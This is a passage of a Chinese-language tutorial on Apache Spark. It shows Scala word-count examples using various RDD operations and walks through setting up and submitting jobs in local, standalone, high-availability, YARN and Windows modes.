class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark03_WordCount</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local"</span>).setAppName(<span class="string">"WordCount"</span>)</span><br><span class="line">        <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparConf)</span><br><span class="line">        wordcount91011(sc)</span><br><span class="line">        sc.stop()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// groupBy</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount1</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> group: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Iterable</span>[<span class="type">String</span>])] = words.groupBy(word=&gt;word)</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = group.mapValues(iter=&gt;iter.size)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// groupByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount2</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> group: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Iterable</span>[<span class="type">Int</span>])] = wordOne.groupByKey()</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = group.mapValues(iter=&gt;iter.size)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reduceByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount3</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordOne.reduceByKey(_+_)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// aggregateByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount4</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordOne.aggregateByKey(<span class="number">0</span>)(_+_, _+_)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// foldByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount5</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordOne.foldByKey(<span class="number">0</span>)(_+_)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// combineByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount6</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordOne.combineByKey(</span><br><span class="line">            v=&gt;v,</span><br><span class="line">            (x:<span class="type">Int</span>, y) =&gt; x + y,</span><br><span class="line">            (x:<span class="type">Int</span>, y:<span class="type">Int</span>) =&gt; x + y</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// countByKey</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount7</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordOne = words.map((_,<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: collection.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>] = wordOne.countByKey()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// countByValue</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount8</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line">        <span class="keyword">val</span> wordCount: collection.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>] = words.countByValue()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reduce, aggregate, fold</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordcount91011</span></span>(sc : <span class="type">SparkContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"Hello Scala"</span>, <span class="string">"Hello Spark"</span>))</span><br><span class="line">        <span class="keyword">val</span> words = rdd.flatMap(_.split(<span class="string">" "</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 【（word, count）,(word, count)】</span></span><br><span class="line">        <span class="comment">// word =&gt; Map[(word,1)]</span></span><br><span class="line">        <span class="keyword">val</span> mapWord = words.map(</span><br><span class="line">            word =&gt; &#123;</span><br><span class="line">                mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]((word,<span class="number">1</span>))</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">       <span class="keyword">val</span> wordCount = mapWord.reduce(</span><br><span class="line">            (map1, map2) =&gt; &#123;</span><br><span class="line">                map2.foreach&#123;</span><br><span class="line">                    <span class="keyword">case</span> (word, count) =&gt; &#123;</span><br><span class="line">                        <span class="keyword">val</span> newCount = map1.getOrElse(word, <span class="number">0</span>L) + count</span><br><span class="line">                        map1.update(word, newCount)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                map1</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        println(wordCount)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、Spark-运行模式">2、Spark 运行模式</h2><h3 id="2-1-概述">2.1 概述</h3><ul><li>local 本地模式(单机)–学习测试使用，分为 local 单线程和 local-cluster 多线程</li><li>standalone 独立集群模式–学习测试使用，典型的 Mater/slave 模式</li><li>standalone-HA 高可用模式–生产环境使用，基于 standalone 模式，使用 zk 搭建高可用，避免 Master 是有单点故障的</li><li>**on yarn 集群模式–生产环境使用，**运行在 yarn 集群之上，由 yarn 负责资源管理，Spark 负责任务调度和计算。好处：计算资源按需伸缩，集群利用率高，共享底层存储，避免数据跨集群迁移</li><li>on mesos 集群模式–国内使用较少，运行在 mesos 资源管理器框架之上，由 mesos 负责资源管理，Spark 负责任务调度和计算</li><li>on cloud 集群模式–中小公司未来会更多的使用云服务，比如 AWS 的 EC2，使用这个模式能很方便的访问 Amazon 的 S3</li></ul><h3 id="2-2-Local模式">2.2 Local模式</h3><p>Local 模式，就是不需要其他任何节点资源就可以在本地执行 Spark 代码的环境，一般用于教学，调试，演示等， 之前在 IDEA 中运行代码的环境我们称之为开发环境，不太一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里我hadoop环境为3.1.3</span></span><br><span class="line">wget https://archive.apache.org/dist/spark/spark-3.0.0/spark-3.0.0-bin-hadoop3.2.tgz</span><br><span class="line">tar -zxvf spark-3.0.0-bin-hadoop3.2.tgz -C /opt/module</span><br><span class="line"><span class="built_in">cd</span> /opt/module</span><br><span class="line">mv spark-3.0.0-bin-hadoop3.2 spark</span><br><span class="line"><span class="comment"># 然后进入spark目录</span></span><br><span class="line">bin/spark-shell</span><br><span class="line"><span class="comment"># 启动后可以进入Web界面进行监控 http://hadoop102:4040/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先在data下创建文本在进入</span></span><br><span class="line">sc.textFile(<span class="string">"data/word.txt"</span>).flatMap(_.split(<span class="string">" "</span>)).map((_,1)).reduceByKey(_+_).collect</span><br><span class="line">:quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================提交应用========</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master <span class="built_in">local</span>[2] \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br><span class="line"><span class="comment"># --class 表示要执行程序的主类，此处可以更换为咱们自己写的应用程序</span></span><br><span class="line"><span class="comment"># --master local[2] 部署模式，默认为本地模式，数字表示分配的虚拟CPU 核数量</span></span><br><span class="line"><span class="comment"># spark-examples_2.12-3.0.0.jar 运行的应用类所在的 jar 包，实际使用时，可以设定为咱们自己打的 jar 包</span></span><br><span class="line"><span class="comment"># 数字 10 表示程序的入口参数，用于设定当前应用的任务数量</span></span><br></pre></td></tr></table></figure><h3 id="2-3-Standalone-模式">2.3 Standalone 模式</h3><p>local 本地模式毕竟只是用来进行练习演示的，真实工作中还是要将应用提交到对应的集群中去执行，这里我们来看看只使用 Spark 自身节点运行的集群模式，也就是我们所谓的独立部署（Standalone）模式。Spark 的 Standalone 模式体现了经典的master-slave 模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里我准备三台机器，hadoop102为master，103，104为slave</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/spark/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1)进入解压缩后路径的 conf 目录，修改 slaves.template 文件名为 slaves</span></span><br><span class="line">mv slaves.template slaves</span><br><span class="line"><span class="comment"># 2)修改 slaves 文件，添加work 节点</span></span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"><span class="comment"># 3)修改 spark-env.sh.template 文件名为 spark-env.sh</span></span><br><span class="line">mv spark-env.sh.template spark-env.sh</span><br><span class="line"><span class="comment"># 4)修改 spark-env.sh 文件，添加 JAVA_HOME 环境变量和集群对应的 master 节点</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/module/jdk1.8.0_121</span><br><span class="line">SPARK_MASTER_HOST=hadoop102</span><br><span class="line">SPARK_MASTER_PORT=7077</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：7077 端口，相当于 hadoop 内部通信的 8020 端口，此处的端口需要确认自己的 Hadoop配置</span></span><br><span class="line"><span class="comment"># 5)分发 spark-standalone 目录</span></span><br><span class="line">xsync spark</span><br><span class="line"></span><br><span class="line"><span class="comment"># =======集群的启动=====</span></span><br><span class="line">sbin/start-all.sh</span><br><span class="line"><span class="comment"># 查看是否启动，worker</span></span><br><span class="line">jpsall</span><br><span class="line"><span class="comment"># 查看 Master 资源监控Web UI 界面: http://hadoop102:8081</span></span><br><span class="line"><span class="comment"># =============提交应用===============</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master spark://hadoop102:7077 \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br><span class="line"><span class="comment"># master spark://hadoop102:7077 独立部署模式，连接到Spark 集群</span></span><br></pre></td></tr></table></figure><p>在提交应用中，一般会同时一些提交参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bin/spark-submit \</span><br><span class="line">--class &lt;main-class&gt;</span><br><span class="line">--master &lt;master-url&gt; \</span><br><span class="line">... <span class="comment"># other options</span></span><br><span class="line">&lt;application-jar&gt; \ [application-arguments]</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>参数</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td>–class</td><td>Spark 程序中包含主函数的类</td></tr><tr><td>–master</td><td>Spark 程序运行的模式(环境)</td></tr><tr><td>–executor-memory 1G</td><td>指定每个 executor 可用内存为 1G</td></tr><tr><td>–total-executor-cores 2</td><td>指定所有executor 使用的cpu 核数为 2 个</td></tr><tr><td>–executor-cores</td><td>指定每个executor 使用的cpu 核数</td></tr><tr><td>application-jar</td><td>打包好的应用 jar，包含依赖。这个 URL 在集群中全局可见。 比如 hdfs:// 共享存储系统，如果是file:// path， 那么所有的节点的path 都包含同样的 jar</td></tr><tr><td>application-arguments</td><td>传给 main()方法的参数</td></tr></tbody></table><p>接下来配置历史服务，由于 spark-shell 停止掉后，集群监控 Hadoop02:8081 页面就看不到历史任务的运行情况，所以开发时都配置历史服务器记录任务运行情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1)修改 spark-defaults.conf.template 文件名为 spark-defaults.conf</span></span><br><span class="line">mv spark-defaults.conf.template spark-defaults.conf</span><br><span class="line"><span class="comment"># 2)修改 spark-default.conf 文件，配置日志存储路径,如果hadoop是单体就是具体的机器名</span></span><br><span class="line">spark.eventLog.enabled <span class="literal">true</span></span><br><span class="line">spark.eventLog.dir hdfs://mycluster/directory</span><br><span class="line"><span class="comment"># 注意：需要启动 hadoop 集群，HDFS 上的directory 目录需要提前存在</span></span><br><span class="line">sbin/start-dfs.sh</span><br><span class="line">hadoop fs -mkdir /directory</span><br><span class="line"><span class="comment"># 3)修改 spark-env.sh 文件, 添加日志配置</span></span><br><span class="line"><span class="built_in">export</span> SPARK_HISTORY_OPTS=<span class="string">"</span></span><br><span class="line"><span class="string">-Dspark.history.ui.port=18080</span></span><br><span class="line"><span class="string">-Dspark.history.fs.logDirectory=hdfs://mycluster/directory</span></span><br><span class="line"><span class="string">-Dspark.history.retainedApplications=30"</span></span><br><span class="line"><span class="comment"># 参数 1 含义：WEB UI 访问的端口号为 18080</span></span><br><span class="line"><span class="comment"># 参数 2 含义：指定历史服务器日志存储路径</span></span><br><span class="line"><span class="comment"># 参数 3 含义：指定保存Application 历史记录的个数，如果超过这个值，旧的应用程序信息将被删除，这个是内存中的应用数，而不是页面上显示的应用数</span></span><br><span class="line"><span class="comment"># 4)分发配置文件</span></span><br><span class="line">xsync conf</span><br><span class="line"><span class="comment"># 重新启动集群和历史服务</span></span><br><span class="line">sbin/start-all.sh</span><br><span class="line">sbin/start-history-server.sh</span><br><span class="line"><span class="comment"># 6)重新执行任务</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master spark://hadoop102:7077 \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br><span class="line"><span class="comment"># 查看历史服务：http://hadoop102:18080</span></span><br><span class="line"><span class="comment"># 这里我不知道为什么，使用集群就报错无法解析mycluster，所以我用了hadoop102:8020</span></span><br></pre></td></tr></table></figure><h3 id="2-4-配置高可用（-Standalone-HA）">2.4 配置高可用（ Standalone +HA）</h3><p>所谓的高可用是因为当前集群中的 Master 节点只有一个，所以会存在单点故障问题。所以为了解决单点故障问题，需要在集群中配置多个 Master 节点，一旦处于活动状态的 Master 发生故障时，由备用 Master 提供服务，保证作业可以继续执行。这里的高可用一般采用Zookeeper 设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里使用了zk脚本，设置两个master，三台机器都要配置好zk</span></span><br><span class="line">zk.sh start</span><br><span class="line"><span class="comment"># 停止集群</span></span><br><span class="line">sbin/stop-all.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 spark-env.sh 文件添加如下配置</span></span><br><span class="line"><span class="comment"># 注 释 如 下 内 容 ： </span></span><br><span class="line"><span class="comment">#SPARK_MASTER_HOST=hadoop102</span></span><br><span class="line"><span class="comment">#SPARK_MASTER_PORT=7077</span></span><br><span class="line"><span class="comment"># 添加如下内容:</span></span><br><span class="line"><span class="comment">#Master 监控页面默认访问端口为 8080，但是可能会和 Zookeeper 冲突，所以改成 8989，也可以自定义，访问 UI 监控页面时请注意</span></span><br><span class="line">SPARK_MASTER_WEBUI_PORT=8989</span><br><span class="line"><span class="built_in">export</span> SPARK_DAEMON_JAVA_OPTS=<span class="string">"</span></span><br><span class="line"><span class="string">-Dspark.deploy.recoveryMode=ZOOKEEPER</span></span><br><span class="line"><span class="string">-Dspark.deploy.zookeeper.url=hadoop102,hadoop103,hadoop104</span></span><br><span class="line"><span class="string">-Dspark.deploy.zookeeper.dir=/spark"</span></span><br><span class="line"><span class="comment"># 分发配置文件</span></span><br><span class="line">xsync conf/</span><br><span class="line">sbin/start-all.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 hadoop103的单独 Master 节点，此时 hadoop103节点 Master 状态处于备用状态</span></span><br><span class="line">sbin/start-master.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交应用</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master spark://hadoop102:7077,hadoop103:7077 \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br></pre></td></tr></table></figure><h3 id="2-5-Yarn-模式">2.5 Yarn 模式</h3><p>独立部署（Standalone）模式由 Spark 自身提供计算资源，无需其他框架提供资源。这种方式降低了和其他第三方资源框架的耦合性，独立性非常强。但是你也要记住，Spark 主要是计算框架，而不是资源调度框架，所以本身提供的资源调度并不是它的强项，所以还是和其他专业的资源调度框架集成会更靠谱一些。所以接下来我们来学习在强大的Yarn 环境下 Spark 是如何工作的（其实是因为在国内工作中，Yarn 使用的非常多）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改 hadoop 配置文件/opt/ha/hadoop-3.1.3/etc/hadoop/yarn-site.xml,  并分发</span></span><br><span class="line">vim /opt/ha/hadoop-3.1.3/etc/hadoop/yarn-site.xml</span><br><span class="line">&lt;!--是否启动一个线程检查每个任务正使用的物理内存量，如果任务超出分配值，则直接将其杀掉，默认是 <span class="literal">true</span> --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;yarn.nodemanager.pmem-check-enabled&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;<span class="literal">false</span>&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;!--是否启动一个线程检查每个任务正使用的虚拟内存量，如果任务超出分配值，则直接将其杀掉，默认是 <span class="literal">true</span> --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;yarn.nodemanager.vmem-check-enabled&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;<span class="literal">false</span>&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 conf/spark-env.sh，添加 JAVA_HOME 和YARN_CONF_DIR 配置</span></span><br><span class="line">mv spark-env.sh.template spark-env.sh</span><br><span class="line"><span class="comment"># 添加以下内容，hadoop天自己的，我这里是ha高可用地址，其他例如YARN_CONF_DIR=/opt/module/hadoop/etc/hadoop</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/module/jdk1.8.0_121</span><br><span class="line">YARN_CONF_DIR=/opt/ha/hadoop-3.1.3/etc/hadoop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之前要启动 HDFS 以及 YARN 集群</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master yarn \</span><br><span class="line">--deploy-mode cluster \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br></pre></td></tr></table></figure><p>配置历史服务器，之前一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改 spark-defaults.conf.template 文件名为 spark-defaults.conf</span></span><br><span class="line"><span class="comment"># 其他一样，主要修改 spark-defaults.conf</span></span><br><span class="line">spark.yarn.historyServer.address=hadoop102:18080</span><br><span class="line">spark.history.ui.port=18080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启history，主要在yarn调度界面就可以直接从历史记录跳转到spark的历史记录了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面会把结果显示在控制台</span></span><br><span class="line">bin/spark-submit \</span><br><span class="line">--class org.apache.spark.examples.SparkPi \</span><br><span class="line">--master yarn \</span><br><span class="line">--deploy-mode client \</span><br><span class="line">./examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br></pre></td></tr></table></figure><h3 id="2-6-K8S-Mesos-模式">2.6 K8S &amp; Mesos 模式</h3><p>Mesos 是Apache 下的开源分布式资源管理框架，它被称为是分布式系统的内核,在Twitter 得到广泛使用,管理着 Twitter 超过 30,0000 台服务器上的应用部署，但是在国内，依然使用着传统的Hadoop 大数据框架，所以国内使用 Mesos 框架的并不多</p><p>容器化部署是目前业界很流行的一项技术，基于Docker 镜像运行能够让用户更加方便地对应用进行管理和运维。容器管理工具中最为流行的就是Kubernetes（k8s），而 Spark 也在最近的版本中支持了k8s 部署模式。可以参考：<a href="https://spark.apache.org/docs/latest/running-on-kubernetes.html" target="_blank" rel="noopener" title="https://spark.apache.org/docs/latest/running-on-kubernetes.html">https://spark.apache.org/docs/latest/running-on-kubernetes.html</a></p><h3 id="2-7-Windows-模式">2.7 Windows 模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://archive.apache.org/dist/spark/spark-3.0.0/</span></span><br><span class="line"><span class="comment"># 将文件 spark-3.0.0-bin-hadoop3.2.tgz 解压缩到无中文无空格的路径中</span></span><br><span class="line"><span class="comment"># 执行解压缩文件路径下 bin 目录中的 spark-shell.cmd 文件，启动 Spark 本地环境</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 bin 目录中创建 input 目录，并添加word.txt 文件, 在命令行中输入脚本代码</span></span><br><span class="line"><span class="comment"># 命令行提交应用</span></span><br><span class="line">spark-submit --class org.apache.spark.examples.SparkPi --master <span class="built_in">local</span>[2] ../examples/jars/spark-examples_2.12-3.0.0.jar 10</span><br></pre></td></tr></table></figure><h3 id="2-8-部署模式对比">2.8 部署模式对比</h3><table><thead><tr><th><strong>模式</strong></th><th><strong>Spark 安装机器数</strong></th><th><strong>需启动的进程</strong></th><th><strong>所属者</strong></th><th><strong>应用场景</strong></th></tr></thead><tbody><tr><td>Local</td><td>1</td><td>无</td><td>Spark</td><td>测试</td></tr><tr><td>Standalone</td><td>3</td><td>Master 及 Worker</td><td>Spark</td><td>单独部署</td></tr><tr><td>Yarn</td><td>1</td><td>Yarn 及 HDFS</td><td>Hadoop</td><td>混合部署</td></tr></tbody></table><h3 id="2-9-端口号">2.9 端口号</h3><ul><li>Spark 查看当前 Spark-shell 运行任务情况端口号：4040（计算）</li><li>Spark Master 内部通信服务端口号：7077</li><li>Standalone 模式下，Spark Master Web 端口号：8080（资源）</li><li>Spark 历史服务器端口号：18080</li><li>Hadoop YARN 任务运行情况查看端口号：8088</li></ul><h2 id="3、Spark-运行架构">3、Spark 运行架构</h2><h3 id="3-1-运行架构">3.1 运行架构</h3><p>Spark 框架的核心是一个计算引擎，整体来说，它采用了标准 master-slave 